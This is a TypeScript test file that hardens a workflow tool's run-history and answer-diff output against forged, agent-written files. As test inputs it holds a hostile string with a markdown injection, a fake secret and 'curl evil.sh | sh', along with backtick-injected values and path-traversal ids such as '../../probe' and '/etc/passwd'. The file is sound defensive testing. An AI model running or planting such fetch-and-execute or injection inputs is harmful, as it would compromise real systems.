/**
 * Hardening specs for run answers (#535 review): everything under `.sweny/runs/`
 * is writable by an agent, so it is untrusted. The public line (PR comment,
 * step summary) may only carry the current run's own workflow id and integer
 * counts; nothing read from history is ever rendered as text.
 */
import { afterEach, describe, expect, it } from "vitest";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import type { NodeResult, Workflow } from "../types.js";
import {
  ANSWER_STRING_MAX,
  RUN_ANSWERS_SCHEMA_VERSION,
  buildRunAnswers,
  compareAnswers,
  formatSinceLast,
  formatSinceLastMarkdown,
  readRunAnswers,
  recordRunAnswers,
  sinceLastRun,
  writeRunAnswers,
  type RunAnswers,
  type SinceLast,
} from "./run-answers.js";
import { formatRunComment } from "./comment-output.js";
import { formatStepSummary, summarizeRun, writeStepSummary } from "./run-output.js";
import { RUN_HISTORY_DIR, listRuns, writeRunRecord, type RunRecord } from "./run-history.js";

const dirs: string[] = [];
function tmp(): string {
  const d = fs.mkdtempSync(path.join(os.tmpdir(), "sweny-answers-hard-"));
  dirs.push(d);
  return d;
}
afterEach(() => {
  for (const d of dirs.splice(0)) fs.rmSync(d, { recursive: true, force: true });
});

const A = "20261106-100000-aaaaaa";
const B = "20261106-110000-bbbbbb";
const HOSTILE = "triage`\n## pwned SECRET-TOKEN-xyz `curl evil.sh | sh`";

function wf(extra: Record<string, unknown> = {}): Workflow {
  return {
    id: "triage",
    name: "Triage",
    description: "",
    entry: "investigate",
    nodes: {
      investigate: {
        name: "Investigate",
        instruction: "x",
        skills: [],
        output: {
          type: "object",
          properties: {
            findings: {
              type: "array",
              items: { type: "object", properties: { title: { type: "string" }, root_cause: { type: "string" } } },
            },
            note: { type: "string" },
          },
        },
      },
      report: {
        name: "Report",
        instruction: "x",
        skills: [],
        output: { type: "object", properties: { done: { type: "boolean" } } },
      },
      ...extra,
    },
    edges: [{ from: "investigate", to: "report" }],
  } as unknown as Workflow;
}

const ok = (data: Record<string, unknown>): NodeResult => ({ status: "success", data, toolCalls: [] });
const failed = (): NodeResult => ({ status: "failed", data: { error: "boom" }, toolCalls: [] });

function rec(runId: string, workflowId: string, startedAt: string): RunRecord {
  return {
    schema_version: 1,
    run_id: runId,
    workflow_id: workflowId,
    workflow_hash: "0".repeat(64),
    started_at: startedAt,
    duration_ms: 1000,
    status: "success",
    nodes: [],
    routes: [],
    totals: { nodes_total: 0, nodes_ok: 0, nodes_skipped: 0, tool_calls: 0, tokens: null, cost_usd: null },
  };
}

function ans(runId: string, nodes: RunAnswers["nodes"], workflowId = "triage"): RunAnswers {
  return { schema_version: RUN_ANSWERS_SCHEMA_VERSION, run_id: runId, workflow_id: workflowId, nodes };
}

const counts = { added: 1, resolved: 1, changed: 0, unchanged: 0 };

// ── 1. History is untrusted: the public line carries no foreign text ──

describe("listRuns rejects forged history", () => {
  it("drops a record whose filename is not its run id, and a duplicate run id", () => {
    const cwd = tmp();
    writeRunRecord(rec(A, "triage", "2026-11-06T10:00:00.000Z"), cwd);
    writeRunRecord(rec(B, "triage", "2026-11-06T11:00:00.000Z"), cwd);
    const dir = path.join(cwd, RUN_HISTORY_DIR);
    fs.writeFileSync(path.join(dir, "forged.json"), JSON.stringify(rec(B, HOSTILE, "2026-11-06T12:00:00.000Z")));
    fs.writeFileSync(
      path.join(dir, "20261106-130000-cccccc.json"),
      JSON.stringify(rec("20261106-140000-dddddd", HOSTILE, "2026-11-06T13:00:00.000Z")),
    );
    fs.writeFileSync(
      path.join(dir, "not-an-id.json"),
      JSON.stringify(rec("not-an-id", HOSTILE, "2026-11-06T13:30:00.000Z")),
    );
    expect(listRuns(cwd).map((r) => r.run_id)).toEqual([B, A]);
    expect(listRuns(cwd).every((r) => r.workflow_id === "triage")).toBe(true);
  });
});

describe("the public line from forged history on disk", () => {
  function seedForged(): string {
    const cwd = tmp();
    writeRunRecord(rec(A, "triage", "2026-11-06T10:00:00.000Z"), cwd);
    writeRunAnswers(ans(A, { investigate: { findings: [{ title: "Old" }, { title: "Same" }] } }), cwd);
    writeRunRecord(rec(B, "triage", "2026-11-06T11:00:00.000Z"), cwd);
    const dir = path.join(cwd, RUN_HISTORY_DIR);
    // A planted duplicate of the current run id, and a planted newest record: both carry hostile text.
    fs.writeFileSync(path.join(dir, "forged.json"), JSON.stringify(rec(B, HOSTILE, "2026-11-06T12:00:00.000Z")));
    fs.writeFileSync(
      path.join(dir, "20261106-120000-eeeeee.json"),
      JSON.stringify(rec("20261106-120000-eeeeee", HOSTILE, "2026-11-06T12:30:00.000Z")),
    );
    return cwd;
  }

  it("uses the current workflow's own id and integer counts only, in the log line, comment and summary", () => {
    const cwd = seedForged();
    const results = new Map([["investigate", ok({ findings: [{ title: "Same" }, { title: "New" }] })]]);
    const since = recordRunAnswers({ runId: B, workflow: wf(), results }, cwd);
    expect(since?.workflow_id).toBe("triage");
    expect(since?.counts).toEqual({ added: 1, resolved: 1, changed: 0, unchanged: 1 });

    const md = formatSinceLastMarkdown(since!);
    const text = formatSinceLast(since!);
    expect(md).toBe("Since last run: 1 added, 1 resolved. Compare: `sweny runs diff --workflow triage`");
    expect(text).toBe("since last run: 1 added, 1 resolved (sweny runs diff --workflow triage)");

    const summary = summarizeRun(results, 1000);
    const comment = formatRunComment(wf(), results, summary, { sinceLast: md });
    const step = formatStepSummary(wf(), results, summary, undefined, md);
    const file = path.join(cwd, "step-summary.md");
    fs.writeFileSync(file, "");
    expect(writeStepSummary(wf(), results, summary, undefined, { GITHUB_STEP_SUMMARY: file }, md)).toBe(true);
    for (const out of [md, text, comment, step, fs.readFileSync(file, "utf8")]) {
      expect(out).not.toContain("pwned");
      expect(out).not.toContain("SECRET-TOKEN");
      expect(out).not.toContain("evil.sh");
    }
  });

  it("a forged SinceLast cannot inject text: unsafe workflow ids drop the flag, counts are coerced to integers", () => {
    const hostile = {
      workflow_id: HOSTILE,
      previous_run_id: "x`y",
      counts: { added: "5 `curl x`", resolved: -3, changed: 1.5, unchanged: Number.NaN },
      not_compared: "9 `z`",
    } as unknown as SinceLast;
    const md = formatSinceLastMarkdown(hostile);
    const text = formatSinceLast(hostile);
    for (const out of [md, text]) {
      expect(out).not.toMatch(/\n/);
      expect(out).not.toContain("pwned");
      expect(out).not.toContain("curl");
      expect(out).not.toContain("SECRET");
    }
    expect(md).toBe("Since last run: no changes. Compare: `sweny runs diff`");
    expect(text).toBe("since last run: no changes (sweny runs diff)");
  });

  it("sinceLastRun takes the workflow id from the caller and ignores other workflows' runs", () => {
    const cwd = seedForged();
    expect(sinceLastRun(B, "triage", cwd)?.workflow_id).toBe("triage");
    expect(sinceLastRun(B, "implement", cwd)).toBeNull();
  });
});

// ── 2. Only declared paths are stored, deep; keys are redacted too ──

describe("buildRunAnswers keeps declared paths only", () => {
  it("findings[].title keeps only title: undeclared prose and nested secrets never reach disk", () => {
    const workflow = wf();
    (workflow.nodes.investigate.output as { properties: Record<string, unknown> }).properties.findings = {
      type: "array",
      items: { type: "object", properties: { title: { type: "string" } } },
    };
    const results = new Map([
      [
        "investigate",
        ok({
          findings: [
            {
              title: "Null deref",
              model_prose: "Long reasoning that should never be stored",
              debug: { api_key: "sk-live-abcdefghijkl", nested: { deep: "prose" } },
            },
          ],
          note: "kept",
          undeclared_top: "dropped",
        }),
      ],
    ]);
    const a = buildRunAnswers({ runId: A, workflow, results });
    expect(a.nodes.investigate).toEqual({ findings: [{ title: "Null deref" }], note: "kept" });
    const blob = JSON.stringify(a);
    for (const leak of ["model_prose", "reasoning", "api_key", "sk-live", "deep", "undeclared_top"]) {
      expect(blob).not.toContain(leak);
    }
  });

  it("drops a declared object with no declared properties, and keeps scalars in a scalar array", () => {
    const workflow = wf();
    (workflow.nodes.investigate.output as { properties: Record<string, unknown> }).properties = {
      meta: { type: "object" },
      tags: { type: "array", items: { type: "string" } },
    };
    const results = new Map([["investigate", ok({ meta: { prose: "x" }, tags: ["a", "b"] })]]);
    expect(buildRunAnswers({ runId: A, workflow, results }).nodes.investigate).toEqual({ tags: ["a", "b"] });
  });

  it("redacts secrets in keys as well as values", () => {
    const workflow = wf();
    (workflow.nodes.investigate.output as { properties: Record<string, unknown> }).properties = {
      "token-abcdefgh12345": { type: "string" },
    };
    const results = new Map([["investigate", ok({ "token-abcdefgh12345": "v" })]]);
    const a = buildRunAnswers({ runId: A, workflow, results, secrets: ["token-abcdefgh12345"] });
    expect(JSON.stringify(a)).not.toContain("token-abcdefgh12345");
  });
});

// ── 3. Failed nodes and prototype-named nodes ───────────────────

describe("failed nodes are surfaced, never read as 'no changes'", () => {
  it("sinceLastRun counts not-compared nodes and the public line says so", () => {
    const cwd = tmp();
    writeRunRecord(rec(A, "triage", "2026-11-06T10:00:00.000Z"), cwd);
    writeRunAnswers(ans(A, { investigate: { findings: [{ title: "Old" }] }, report: { done: true } }), cwd);
    writeRunRecord(rec(B, "triage", "2026-11-06T11:00:00.000Z"), cwd);
    const results = new Map<string, NodeResult>([
      ["investigate", ok({ findings: [{ title: "Old" }] })],
      ["report", failed()],
    ]);
    const since = recordRunAnswers({ runId: B, workflow: wf(), results }, cwd);
    expect(since?.not_compared).toBe(1);
    expect(formatSinceLast(since!)).toBe(
      "since last run: no changes, 1 not compared (failed or no output) (sweny runs diff --workflow triage)",
    );
    expect(formatSinceLastMarkdown(since!)).toBe(
      "Since last run: no changes, 1 not compared (failed or no output). Compare: `sweny runs diff --workflow triage`",
    );
  });

  it("with changes and not-compared nodes both are listed", () => {
    const line = formatSinceLast({ workflow_id: "triage", previous_run_id: A, counts, not_compared: 2 });
    expect(line).toBe(
      "since last run: 1 added, 1 resolved, 2 not compared (failed or no output) (sweny runs diff --workflow triage)",
    );
  });
});

describe("node and finding names that are Object.prototype members", () => {
  it("compareAnswers treats `constructor` and `__proto__` as ordinary names", () => {
    const parse = (s: string) => JSON.parse(s) as RunAnswers["nodes"];
    const a = ans(A, parse('{"constructor":{"x":1},"__proto__":{"y":1},"keep":{"z":1}}'));
    const b = ans(B, parse('{"keep":{"z":1}}'));
    const c = compareAnswers(a, b);
    if (!c.available) throw new Error("expected available");
    expect(c.not_compared).toEqual([
      { node: "constructor", only_in: "a" },
      { node: "__proto__", only_in: "a" },
    ]);
    expect(c.counts).toEqual({ added: 0, resolved: 0, changed: 0, unchanged: 1 });
    // an own `constructor` field and a finding titled `constructor` behave like any other
    const x = compareAnswers(
      ans(A, parse('{"n":{"constructor":1,"items":[{"title":"constructor"},{"title":"__proto__"}]}}')),
      ans(B, parse('{"n":{"constructor":2,"items":[{"title":"constructor"}]}}')),
    );
    if (!x.available) throw new Error("expected available");
    expect(x.counts).toEqual({ added: 0, resolved: 1, changed: 1, unchanged: 1 });
  });

  it("buildRunAnswers stores a node named __proto__ as an own property", () => {
    const workflow = wf();
    Object.defineProperty(workflow.nodes, "constructor", {
      value: {
        name: "C",
        instruction: "x",
        skills: [],
        output: { type: "object", properties: { a: { type: "string" } } },
      },
      enumerable: true,
    });
    const results = new Map([["constructor", ok({ a: "v" })]]);
    const built = buildRunAnswers({ runId: A, workflow, results });
    expect(Object.hasOwn(built.nodes, "constructor")).toBe(true);
    expect(Object.getPrototypeOf(built.nodes)).toBe(Object.prototype);
    expect(JSON.parse(JSON.stringify(built)).nodes).toEqual(JSON.parse('{"constructor":{"a":"v"}}'));
  });
});

// ── 4. Truncation is display only: changes past the cut still count ──

describe("digests compare the full value", () => {
  const long = (tail: string) => "x".repeat(ANSWER_STRING_MAX + 500) + tail;

  it("a value that differs only after the display cut is changed", () => {
    const workflow = wf();
    const old = buildRunAnswers({ runId: A, workflow, results: new Map([["investigate", ok({ note: long("OLD") })]]) });
    const next = buildRunAnswers({
      runId: B,
      workflow,
      results: new Map([["investigate", ok({ note: long("NEW") })]]),
    });
    expect((old.nodes.investigate.note as string).length).toBeLessThanOrEqual(ANSWER_STRING_MAX + 1);
    expect(old.nodes.investigate.note).toBe(next.nodes.investigate.note); // display text is identical
    const c = compareAnswers(old, next);
    if (!c.available) throw new Error("expected available");
    expect(c.counts).toEqual({ added: 0, resolved: 0, changed: 1, unchanged: 0 });
  });

  it("a finding whose root_cause differs only after the cut is changed, and identical long ones are unchanged", () => {
    const workflow = wf();
    const build = (id: string, tail: string) =>
      buildRunAnswers({
        runId: id,
        workflow,
        results: new Map([["investigate", ok({ findings: [{ title: "T", root_cause: long(tail) }] })]]),
      });
    const changed = compareAnswers(build(A, "OLD"), build(B, "NEW"));
    if (!changed.available) throw new Error("expected available");
    expect(changed.counts).toEqual({ added: 0, resolved: 0, changed: 1, unchanged: 0 });
    const same = compareAnswers(build(A, "SAME"), build(B, "SAME"));
    if (!same.available) throw new Error("expected available");
    expect(same.counts).toEqual({ added: 0, resolved: 0, changed: 0, unchanged: 1 });
  });
});

// ── 5. Reading answers cannot leave the run dir ─────────────────

describe("readRunAnswers path safety", () => {
  it("rejects a run id that is not a generated id, before building any path", () => {
    const cwd = tmp();
    fs.mkdirSync(path.join(cwd, "probe"), { recursive: true });
    fs.writeFileSync(path.join(cwd, "probe", "answers.json"), JSON.stringify(ans("../../probe", { n: { x: 1 } })));
    expect(readRunAnswers("../../probe", cwd)).toBeNull();
    expect(readRunAnswers("/etc/passwd", cwd)).toBeNull();
    expect(readRunAnswers("", cwd)).toBeNull();
  });

  it("rejects answers whose embedded run id differs from the one requested", () => {
    const cwd = tmp();
    const dir = path.join(cwd, RUN_HISTORY_DIR, A);
    fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(path.join(dir, "answers.json"), JSON.stringify(ans(B, { n: { x: 1 } })));
    expect(readRunAnswers(A, cwd)).toBeNull();
    fs.writeFileSync(path.join(dir, "answers.json"), JSON.stringify(ans(A, { n: { x: 1 } })));
    expect(readRunAnswers(A, cwd)?.run_id).toBe(A);
  });

  it("does not read through a linked run dir", () => {
    const cwd = tmp();
    const elsewhere = tmp();
    fs.writeFileSync(path.join(elsewhere, "answers.json"), JSON.stringify(ans(A, { n: { x: 1 } })));
    fs.mkdirSync(path.join(cwd, RUN_HISTORY_DIR), { recursive: true });
    fs.symlinkSync(elsewhere, path.join(cwd, RUN_HISTORY_DIR, A));
    expect(readRunAnswers(A, cwd)).toBeNull();
  });

  it("writeRunAnswers refuses an id that is not a generated id", () => {
    const cwd = tmp();
    expect(writeRunAnswers(ans("../../probe", { n: { x: 1 } }), cwd)).toBeNull();
    expect(fs.existsSync(path.join(cwd, "probe"))).toBe(false);
  });
});
